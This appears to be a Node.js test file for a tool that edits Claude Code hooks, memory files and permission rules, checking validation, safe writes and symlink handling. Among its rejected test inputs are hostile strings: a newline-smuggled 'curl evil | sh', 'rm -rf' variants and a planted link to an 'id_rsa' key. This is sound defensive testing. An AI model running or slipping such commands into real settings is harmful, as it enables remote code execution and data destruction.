const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const {
  scanSetup, scanHooks, scanMemory, validateHook, withHook, withoutHook, replaceHook, hookEntry, hasHook,
  changeHooks, readMemory, writeMemory,
  scanPermissions, explainRule, validateRule, withRule, withoutRule, changeSettings,
} = require('../src/main/claude/setup');

const dirs = [];
const tmp = () => { const d = fs.mkdtempSync(path.join(os.tmpdir(), 'shellby-setup-')); dirs.push(d); return d; };
process.on('exit', () => { for (const d of dirs) try { fs.rmSync(d, { recursive: true, force: true }); } catch {} });

function put(file, text) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, typeof text === 'string' ? text : JSON.stringify(text, null, 2));
}
const cmd = (command, extra = {}) => ({ type: 'command', command, ...extra });

// ---- validateHook
test('validateHook: accepts a known event and trims', () => {
  assert.deepEqual(validateHook({ event: 'PreToolUse', matcher: ' Bash ', command: ' echo hi ', timeout: '30' }).hook,
    { event: 'PreToolUse', matcher: 'Bash', command: 'echo hi', timeout: 30 });
});
test('validateHook: drops the matcher on events that have none', () => {
  assert.equal(validateHook({ event: 'Stop', matcher: 'Bash', command: 'x' }).hook.matcher, '');
});
test('validateHook: rejects unknown events, empty commands and bad timeouts', () => {
  assert.ok(validateHook({ event: 'Whenever', command: 'x' }).error);
  assert.ok(validateHook({ event: 'Stop', command: '   ' }).error);
  assert.ok(validateHook({ event: 'Stop', command: 'x', timeout: 0 }).error);
  assert.ok(validateHook({ event: 'Stop', command: 'x', timeout: 1.5 }).error);
  assert.ok(validateHook({ event: 'Stop', command: 'a\0b' }).error);
  assert.ok(validateHook(null).error);
});

// ---- pure edits
test('withHook: joins a group with the same matcher, or starts a new one', () => {
  const s0 = { model: 'opus', hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [cmd('a')] }] } };
  const s1 = withHook(s0, { event: 'PreToolUse', matcher: 'Bash', command: 'b', timeout: null });
  assert.deepEqual(s1.hooks.PreToolUse, [{ matcher: 'Bash', hooks: [cmd('a'), cmd('b')] }]);
  const s2 = withHook(s1, { event: 'PreToolUse', matcher: 'Edit', command: 'c', timeout: 5 });
  assert.deepEqual(s2.hooks.PreToolUse[1], { matcher: 'Edit', hooks: [cmd('c', { timeout: 5 })] });
  const s3 = withHook({}, { event: 'Stop', matcher: '', command: 'd', timeout: null });
  assert.deepEqual(s3, { hooks: { Stop: [{ hooks: [cmd('d')] }] } });
  // never mutates the input
  assert.deepEqual(s0, { model: 'opus', hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [cmd('a')] }] } });
  assert.equal(s1.model, 'opus');
});

test('withoutHook: removes one entry and tidies empty groups, events and the hooks key', () => {
  const s0 = { model: 'x', hooks: { Stop: [{ hooks: [cmd('a'), cmd('b')] }], PreToolUse: [{ matcher: '*', hooks: [cmd('c')] }] } };
  const s1 = withoutHook(s0, { event: 'Stop', group: 0, hook: 0 });
  assert.deepEqual(s1.hooks.Stop, [{ hooks: [cmd('b')] }]);
  const s2 = withoutHook(s1, { event: 'Stop', group: 0, hook: 0 });
  assert.equal('Stop' in s2.hooks, false);
  const s3 = withoutHook(s2, { event: 'PreToolUse', group: 0, hook: 0 });
  assert.deepEqual(s3, { model: 'x' });
  assert.equal(s0.hooks.Stop[0].hooks.length, 2, 'input untouched');
  assert.equal(withoutHook(s0, { event: 'Nope', group: 0, hook: 0 }), s0, 'missing target is a no-op');
});

test('replaceHook: edits in place, keeps unknown keys, moves when the matcher changes', () => {
  const s0 = { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [cmd('a', { timeout: 9, statusMessage: 'hi' }), cmd('z')] }] } };
  const inPlace = replaceHook(s0, { event: 'PreToolUse', group: 0, hook: 0 }, { event: 'PreToolUse', matcher: 'Bash', command: 'b', timeout: null });
  assert.deepEqual(inPlace.hooks.PreToolUse[0].hooks, [cmd('b', { statusMessage: 'hi' }), cmd('z')]);
  const moved = replaceHook(s0, { event: 'PreToolUse', group: 0, hook: 0 }, { event: 'PreToolUse', matcher: 'Edit', command: 'b', timeout: null });
  assert.deepEqual(moved.hooks.PreToolUse, [{ matcher: 'Bash', hooks: [cmd('z')] }, { matcher: 'Edit', hooks: [cmd('b')] }]);
  const otherEvent = replaceHook(s0, { event: 'PreToolUse', group: 0, hook: 1 }, { event: 'Stop', matcher: '', command: 'z', timeout: null });
  assert.deepEqual(otherEvent.hooks.Stop, [{ hooks: [cmd('z')] }]);
});

// ---- scanning
test('scanHooks: lists user, project, local and plugin hooks with editability', () => {
  const home = tmp();
  const cwd = path.join(home, 'proj');
  const plug = path.join(home, 'plug');
  put(path.join(home, '.claude', 'settings.json'), { hooks: { Stop: [{ hooks: [cmd('say done')] }] } });
  put(path.join(cwd, '.claude', 'settings.json'), { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [cmd('lint'), { type: 'prompt', prompt: 'is it safe?' }] }] } });
  put(path.join(cwd, '.claude', 'settings.local.json'), '{ not json');
  put(path.join(plug, 'hooks', 'hooks.json'), { hooks: { SessionStart: [{ hooks: [cmd('hello')] }] } });
  const { hooks, files } = scanHooks({ home, cwd, plugins: [{ name: 'p', path: plug }] });
  assert.deepEqual(hooks.map(h => [h.event, h.source, h.command, h.editable]), [
    ['SessionStart', 'plugin:p', 'hello', false],
    ['PreToolUse', 'project', 'lint', true],
    ['PreToolUse', 'project', 'is it safe?', false],
    ['Stop', 'user', 'say done', true],
  ]);
  assert.deepEqual(files.map(f => [f.scope, f.state]), [['user', 'ok'], ['project', 'ok'], ['local', 'unreadable']]);
  assert.equal(hooks[1].matcher, 'Bash');
});

test('scanHooks: the home folder is not listed twice as a project', () => {
  const home = tmp();
  assert.deepEqual(scanHooks({ home, cwd: home }).files.map(f => f.scope), ['user']);
});

test('scanMemory: user always, project offered, rules and parent folders when present', () => {
  const home = tmp();
  const parent = path.join(home, 'work');
  const cwd = path.join(parent, 'proj');
  fs.mkdirSync(cwd, { recursive: true });
  put(path.join(home, '.claude', 'rules', 'style.md'), '# style');
  put(path.join(parent, 'CLAUDE.md'), 'parent');
  put(path.join(cwd, 'CLAUDE.local.md'), 'mine');
  const mem = scanMemory({ home, cwd });
  const rel = m => [m.scope, path.relative(home, m.path), m.exists];
  assert.deepEqual(mem.map(rel).filter(r => !r[1].startsWith('..')), [
    ['user', path.join('.claude', 'CLAUDE.md'), false],
    ['user-rule', path.join('.claude', 'rules', 'style.md'), true],
    ['project', path.join('work', 'proj', 'CLAUDE.md'), false],
    ['local', path.join('work', 'proj', 'CLAUDE.local.md'), true],
    ['parent', path.join('work', 'CLAUDE.md'), true],
  ]);
});

test('scanMemory: an existing .claude/CLAUDE.md replaces the root suggestion', () => {
  const home = tmp();
  const cwd = path.join(home, 'proj');
  put(path.join(cwd, '.claude', 'CLAUDE.md'), 'x');
  const project = scanMemory({ home, cwd }).filter(m => m.scope === 'project');
  assert.deepEqual(project.map(m => path.relative(cwd, m.path)), [path.join('.claude', 'CLAUDE.md')]);
});

test('scanSetup: bundles hooks, settings, memory and the event list', () => {
  const home = tmp();
  const s = scanSetup({ home, cwd: home });
  assert.deepEqual(Object.keys(s).sort(), ['events', 'hooks', 'memory', 'permissions', 'recipeGroups', 'recipes', 'scannedAt', 'settings']);
  assert.ok(s.events.some(e => e.name === 'PreToolUse' && e.matcher));
});

test('HOOK_EVENTS: every moment has a plain label, and says what it can stop', () => {
  const { HOOK_EVENTS } = require('../src/main/claude/setup');
  for (const e of HOOK_EVENTS) {
    assert.match(e.label, /^[A-Z]/, e.name);
    assert.ok(e.blocks === null || typeof e.blocks === 'string', e.name);
    if (e.choices) assert.ok(e.matcher && e.choices.every(([v, l]) => v && l), e.name);
  }
  assert.ok(HOOK_EVENTS.find(e => e.name === 'PreToolUse').tools);
  assert.equal(HOOK_EVENTS.find(e => e.name === 'Notification').blocks, null);
});

test('scanHooks: each row says what it does, by recipe or by its command', () => {
  const { RECIPES } = require('../src/main/hooks/recipes');
  const home = tmp();
  const guard = RECIPES.find(r => r.id === 'guard-git');
  put(path.join(home, '.claude', 'settings.json'), { hooks: {
    PreToolUse: [{ matcher: 'Bash', hooks: [cmd(guard.command), cmd('node "C:\\hooks\\check.js"')] }],
  } });
  const rows = scanHooks({ home, cwd: home }).hooks;
  assert.deepEqual(rows.map(r => [r.summary, r.recipe]), [[guard.title, 'guard-git'], ['Runs check.js', null]]);
  assert.equal(rows[0].icon, guard.icon);
});

// ---- pausing
test('hookEntry + withHook: a paused hook goes back exactly as it was', () => {
  const entry = { type: 'command', command: 'a', timeout: 5, statusMessage: 'Checking' };
  const settings = { model: 'opus', hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [entry, cmd('b')] }] } };
  const at = { event: 'PreToolUse', group: 0, hook: 0 };
  const taken = hookEntry(settings, at);
  assert.deepEqual(taken, { event: 'PreToolUse', matcher: 'Bash', entry });
  const paused = withoutHook(settings, at);
  assert.deepEqual(paused.hooks.PreToolUse[0].hooks, [cmd('b')]);
  const back = withHook(paused, { event: taken.event, matcher: taken.matcher }, taken.entry);
  assert.deepEqual(back.hooks.PreToolUse[0].hooks, [cmd('b'), entry]);
  assert.equal(back.model, 'opus');
  assert.equal(hookEntry(settings, { event: 'Stop', group: 0, hook: 0 }), null);
  // Its group was emptied meanwhile: a new one is made.
  const gone = withoutHook({ hooks: { Stop: [{ hooks: [cmd('x')] }] } }, { event: 'Stop', group: 0, hook: 0 });
  assert.deepEqual(withHook(gone, { event: 'Stop', matcher: '' }, cmd('x')), { hooks: { Stop: [{ hooks: [cmd('x')] }] } });
});

test('hasHook: spots an entry that is already back, so Resume never doubles it', () => {
  const settings = { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [cmd('a', { timeout: 5 })] }] } };
  assert.equal(hasHook(settings, { event: 'PreToolUse', matcher: 'Bash' }, cmd('a', { timeout: 5 })), true);
  assert.equal(hasHook(settings, { event: 'PreToolUse', matcher: 'Edit' }, cmd('a', { timeout: 5 })), false);
  assert.equal(hasHook(settings, { event: 'PreToolUse', matcher: 'Bash' }, cmd('a')), false);
  assert.equal(hasHook({}, { event: 'Stop', matcher: '' }, cmd('a')), false);
});

test('validateHook: refuses characters that hide what a command says', () => {
  for (const c of ['echo hi\u202e', 'rm\u200b -rf x', 'echo\u00a0hi', 'echo\u3000hi']) {
    assert.match(validateHook({ event: 'Stop', command: c }).error, /invisible or unusual/, JSON.stringify(c));
  }
  assert.equal(validateHook({ event: 'Stop', command: 'echo "héllo wörld"' }).error, undefined);
});

// ---- writing
test('changeHooks: writes, keeps a one-time backup, refuses stale or unreadable files', () => {
  const dir = tmp();
  const file = path.join(dir, 'settings.json');
  put(file, { model: 'opus', hooks: { Stop: [{ hooks: [cmd('a')] }] } });
  const at = { event: 'Stop', group: 0, hook: 0 };
  const fp = JSON.stringify(['', cmd('a')]);
  const r = changeHooks(file, s => replaceHook(s, at, { event: 'Stop', matcher: '', command: 'b', timeout: null }), { at, fp });
  assert.deepEqual(r, { ok: true });
  assert.deepEqual(JSON.parse(fs.readFileSync(file, 'utf8')), { model: 'opus', hooks: { Stop: [{ hooks: [cmd('b')] }] } });
  assert.ok(fs.existsSync(`${file}.shellby-backup`));

  const stale = changeHooks(file, s => withoutHook(s, at), { at, fp });
  assert.equal(stale.conflict, true, 'the hook it pointed at was edited');

  put(file, '{ broken');
  assert.equal(changeHooks(file, s => s).ok, false);
});

test('changeHooks: creates a missing settings file', () => {
  const file = path.join(tmp(), '.claude', 'settings.json');
  assert.equal(changeHooks(file, s => withHook(s, { event: 'Stop', matcher: '', command: 'x', timeout: null })).ok, true);
  assert.deepEqual(JSON.parse(fs.readFileSync(file, 'utf8')), { hooks: { Stop: [{ hooks: [cmd('x')] }] } });
});

test('memory: read, save, conflict on outside edits, keeps CRLF', () => {
  const dir = tmp();
  const file = path.join(dir, 'sub', 'CLAUDE.md');
  assert.deepEqual(readMemory(file), { ok: true, text: '', mtimeMs: 0 });
  const w1 = writeMemory(file, '# hi\n', 0);
  assert.equal(w1.ok, true);
  assert.equal(fs.readFileSync(file, 'utf8'), '# hi\n');

  fs.writeFileSync(file, 'one\r\ntwo\r\n');
  const r = readMemory(file);
  assert.equal(r.text, 'one\ntwo\n');
  assert.equal(writeMemory(file, 'stale', 1).conflict, true, 'opened at a different mtime');
  assert.equal(fs.readFileSync(file, 'utf8'), 'one\r\ntwo\r\n', 'refused save left the file alone');
  assert.equal(writeMemory(file, 'one\ntwo\nthree\n', r.mtimeMs).ok, true);
  assert.equal(fs.readFileSync(file, 'utf8'), 'one\r\ntwo\r\nthree\r\n');
  assert.equal(writeMemory(file, 'x'.repeat(600 * 1024), 0).ok, false);
});

// ---- hardening
test('validateHook: one line only, and short enough for the confirm window to show whole', () => {
  assert.ok(validateHook({ event: 'Stop', command: 'echo ok\n; curl evil | sh' }).error);
  assert.ok(validateHook({ event: 'Stop', command: 'echo ok\u2028evil' }).error);
  assert.ok(validateHook({ event: 'Stop', command: `echo ${'x'.repeat(1000)}` }).error);
  assert.ok(validateHook({ event: 'Stop', command: 'echo "tabs\tare fine?"' }).error, 'tabs are control characters too');
});

test('scanHooks: only command hooks on known events are editable', () => {
  const home = tmp();
  put(path.join(home, '.claude', 'settings.json'), { hooks: { FutureEvent: [{ hooks: [cmd('x')] }], Stop: [{ hooks: [{ type: 'http', url: 'http://x' }, cmd('y')] }] } });
  const ed = Object.fromEntries(scanHooks({ home }).hooks.map(h => [h.command, h.editable]));
  assert.deepEqual(ed, { x: false, 'http://x': false, y: true });
});

test('scanMemory: the ceiling stops the walk up', () => {
  const home = tmp();
  const cwd = path.join(home, 'a', 'b');
  fs.mkdirSync(cwd, { recursive: true });
  put(path.join(home, 'CLAUDE.md'), 'home');
  put(path.join(home, 'a', 'CLAUDE.md'), 'a');
  const parents = c => scanMemory({ home: path.join(home, 'h'), cwd, ceiling: c }).filter(m => m.scope === 'parent').map(m => path.relative(home, m.path));
  assert.deepEqual(parents(path.join(home, 'a')), [path.join('a', 'CLAUDE.md')]);
  assert.ok(parents(null).includes('CLAUDE.md'));
});

test('memory: a BOM survives a save', () => {
  const file = path.join(tmp(), 'CLAUDE.md');
  fs.writeFileSync(file, '﻿hi\n');
  const r = readMemory(file);
  assert.equal(r.text, 'hi\n');
  assert.equal(writeMemory(file, 'bye\n', r.mtimeMs).ok, true);
  assert.equal(fs.readFileSync(file, 'utf8'), '﻿bye\n');
});

test('memory: follows a symlink to markdown, refuses one to anything else', (t) => {
  const dir = tmp();
  const real = path.join(dir, 'dotfiles', 'claude.md');
  const secret = path.join(dir, 'id_rsa');
  put(real, 'real\n');
  put(secret, 'KEY');
  try {
    fs.symlinkSync(real, path.join(dir, 'CLAUDE.md'), 'file');
    fs.symlinkSync(secret, path.join(dir, 'planted.md'), 'file');
  } catch { t.skip('symlinks need Developer Mode or admin on Windows'); return; }
  const link = path.join(dir, 'CLAUDE.md');
  const r = readMemory(link);
  assert.equal(r.text, 'real\n');
  assert.equal(writeMemory(link, 'edited\n', r.mtimeMs).ok, true);
  assert.equal(fs.readFileSync(real, 'utf8'), 'edited\n', 'wrote through the link');
  assert.ok(fs.lstatSync(link).isSymbolicLink(), 'the link is still a link');
  assert.equal(readMemory(path.join(dir, 'planted.md')).ok, false);
  assert.equal(writeMemory(path.join(dir, 'planted.md'), 'x', 0).ok, false);
  assert.equal(fs.readFileSync(secret, 'utf8'), 'KEY');
});

// ---- permission rules

test('validateRule: takes tool names with or without a specifier, refuses the rest', () => {
  assert.deepEqual(validateRule('allow', ' Bash(npm run test:*) '), { list: 'allow', rule: 'Bash(npm run test:*)' });
  assert.deepEqual(validateRule('deny', 'Read(./.env)'), { list: 'deny', rule: 'Read(./.env)' });
  assert.deepEqual(validateRule('ask', 'mcp__github__create_issue'), { list: 'ask', rule: 'mcp__github__create_issue' });
  assert.ok(validateRule('maybe', 'Edit').error);
  assert.ok(validateRule('allow', '').error);
  assert.ok(validateRule('allow', 'rm -rf /').error);
  assert.ok(validateRule('allow', 'Bash(a\nb)').error, 'one line only');
  assert.ok(validateRule('allow', `Bash(${'x'.repeat(600)})`).error);
});

test('explainRule: says in plain words what each kind of rule covers', () => {
  assert.equal(explainRule('allow', 'Bash(npm run test:*)'), 'Claude doesn\'t ask before running any shell command that starts with "npm run test".');
  assert.equal(explainRule('allow', 'Bash(git *)'), 'Claude doesn\'t ask before running any shell command that starts with "git".');
  assert.match(explainRule('allow', 'Bash(git * --force)'), /matching "git \* --force" \(\* stands for anything\)/);
  assert.match(explainRule('allow', 'Bash(netstat -ano)'), /the shell command "netstat -ano"/);
  assert.match(explainRule('deny', 'Read(./.env)'), /^Claude is blocked from reading files matching "\.\/\.env"/);
  assert.match(explainRule('ask', 'Edit'), /^Claude always asks you before editing any file/);
  assert.match(explainRule('allow', 'WebFetch(domain:github.com)'), /fetching pages from github\.com/);
  assert.match(explainRule('allow', 'WebSearch'), /searching the web/);
  assert.match(explainRule('allow', 'Skill(claude-api)'), /the claude-api skill/);
  assert.match(explainRule('allow', 'mcp__github'), /any tool from the github MCP server/);
  assert.match(explainRule('allow', 'mcp__github__*'), /any tool from the github MCP server/);
  assert.match(explainRule('allow', 'mcp__plugin_github_github__create_issue'), /the create_issue tool from the plugin_github_github MCP server/);
  assert.match(explainRule('allow', 'Frobnicate(x)'), /the Frobnicate tool for "x"/);
});

test('withRule / withoutRule: add once, remove cleanly, keep everything else', () => {
  const s = { model: 'opus', permissions: { allow: ['Edit'], defaultMode: 'acceptEdits' } };
  const added = withRule(s, 'allow', 'Bash(git status)');
  assert.deepEqual(added.permissions.allow, ['Edit', 'Bash(git status)']);
  assert.equal(withRule(added, 'allow', 'Edit'), added, 'a rule already there is left alone');
  assert.deepEqual(s.permissions.allow, ['Edit'], 'the original is not mutated');
  const denied = withRule({}, 'deny', 'WebFetch');
  assert.deepEqual(denied, { permissions: { deny: ['WebFetch'] } });
  assert.deepEqual(withoutRule(denied, 'deny', 'WebFetch'), {}, 'an empty permissions block goes');
  assert.deepEqual(withoutRule(added, 'allow', 'Edit').permissions, { allow: ['Bash(git status)'], defaultMode: 'acceptEdits' });
  assert.equal(withoutRule(s, 'deny', 'Edit'), s, 'removing a rule that is not there changes nothing');
});

test('scanPermissions: rules from each settings file, with where they live', () => {
  const home = tmp();
  const cwd = path.join(home, 'proj');
  put(path.join(home, '.claude', 'settings.json'), { permissions: { allow: ['Read'], deny: ['Bash(rm:*)'] } });
  put(path.join(cwd, '.claude', 'settings.local.json'), { permissions: { ask: ['Bash(git push:*)'], defaultMode: 'plan' } });
  const { rules, files } = scanPermissions({ home, cwd });
  assert.deepEqual(rules.map(r => `${r.scope}:${r.list}:${r.rule}`), ['user:allow:Read', 'user:deny:Bash(rm:*)', 'local:ask:Bash(git push:*)']);
  assert.equal(files.find(f => f.scope === 'local').defaultMode, 'plan');
});

test('scanPermissions: long and multi-line rules come back whole, so removing one can find it', () => {
  const home = tmp();
  const long = `Bash(${'x'.repeat(700)})`;
  const multi = 'Bash(git commit -m "$(cat <<\'EOF\'\nfix\nEOF\n)")';
  put(path.join(home, '.claude', 'settings.json'), { permissions: { allow: [long, multi] } });
  const { rules } = scanPermissions({ home, cwd: home });
  assert.deepEqual(rules.map(r => r.rule), [long, multi]);
  assert.deepEqual(withoutRule({ permissions: { allow: [long, multi] } }, 'allow', long), { permissions: { allow: [multi] } });
});

test('changeSettings: writes the change and keeps a backup', () => {
  const dir = tmp();
  const file = path.join(dir, 'settings.json');
  put(file, { model: 'opus' });
  assert.equal(changeSettings(file, s => withRule(s, 'allow', 'Edit')).ok, true);
  assert.deepEqual(JSON.parse(fs.readFileSync(file, 'utf8')), { model: 'opus', permissions: { allow: ['Edit'] } });
  assert.ok(fs.existsSync(`${file}.shellby-backup`));
});
